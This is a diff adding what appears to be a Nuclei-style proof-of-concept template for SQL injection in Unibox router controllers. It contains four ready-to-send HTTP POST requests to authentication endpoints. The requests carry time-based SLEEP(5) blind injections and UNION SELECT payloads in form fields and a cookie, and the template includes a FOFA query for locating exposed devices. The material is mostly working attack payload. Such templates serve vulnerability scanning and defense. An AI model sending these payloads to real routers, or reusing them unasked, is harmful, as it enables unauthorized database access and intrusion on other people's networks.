@@ -1,0 +1,138 @@
+id: poc-wag9k4dwmrq2gvkt
+info:
+  name: Unibox路由器SQL注入漏洞合集
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wag9k4dwmrq2gvkt
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: wag9k4dwmrq2gvkt
+    fofa: body="Unibox" && body="Controller"
+http:
+- raw:
+  - 'POST /authentication/update_byod.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:139.0) Gecko/20100101 Firefox/139.0
+
+    Cookie: rolearray=1'';accessarray=1;selectedmodules=1
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate, br, zstd
+
+    Connection: keep-alive
+
+    Sec-Fetch-Dest: script
+
+    Sec-Fetch-Mode: no-cors
+
+    Sec-Fetch-Site: cross-site
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    update=1&macAddress=1'' AND (SELECT 7876 FROM (SELECT(SLEEP(5)))ogZo) AND ''NXsn''=''NXsn&oldMacAddress=
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1749286592717-8c4764c9-517d-4f4c-b1f8-2860e52b34b6.png)'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
+- raw:
+  - 'POST /authentication/test_userlogin.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:139.0) Gecko/20100101 Firefox/139.0
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate, br, zstd
+
+    Connection: keep-alive
+
+    Sec-Fetch-Dest: script
+
+    Sec-Fetch-Mode: no-cors
+
+    Sec-Fetch-Site: cross-site
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    username=-3423'' UNION ALL SELECT CONCAT(0x71627a7171,0x6c6561796e6f766466637954775a7646627a494c4c466f5876624c7254674a734e654163566a5768,0x7170717871)-- -
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1749286592946-a2090550-0f9d-4e20-91b4-41e5b6f032f3.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /authentication/preworldpay.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:139.0) Gecko/20100101 Firefox/139.0
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate, br, zstd
+
+    Connection: keep-alive
+
+    Sec-Fetch-Dest: script
+
+    Sec-Fetch-Mode: no-cors
+
+    Sec-Fetch-Site: cross-site
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    req_customercode=1'' AND (SELECT 9761 FROM (SELECT(SLEEP(5)))UqnL) AND ''AaNT''=''AaNT
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1749286593220-684f9fe0-c368-476f-b765-ee7a0407aed4.png)'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
+- raw:
+  - 'POST /authentication/postworldpay.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:139.0) Gecko/20100101 Firefox/139.0
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate, br, zstd
+
+    Connection: keep-alive
+
+    Sec-Fetch-Dest: script
+
+    Sec-Fetch-Mode: no-cors
+
+    Sec-Fetch-Site: cross-site
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    successpage=1&failpage=1&transactionid=1&amount=1&status=1&insetid=1 UNION ALL SELECT CONCAT(0x7171786a71,0x4f6d6f436b6f44495472796e46414b4e6b79576d424d6f47616558644f726e625041617857767848,0x716a7a6271),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1749286593520-e2b20263-2f21-493a-bb1e-a0c9ab188347.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
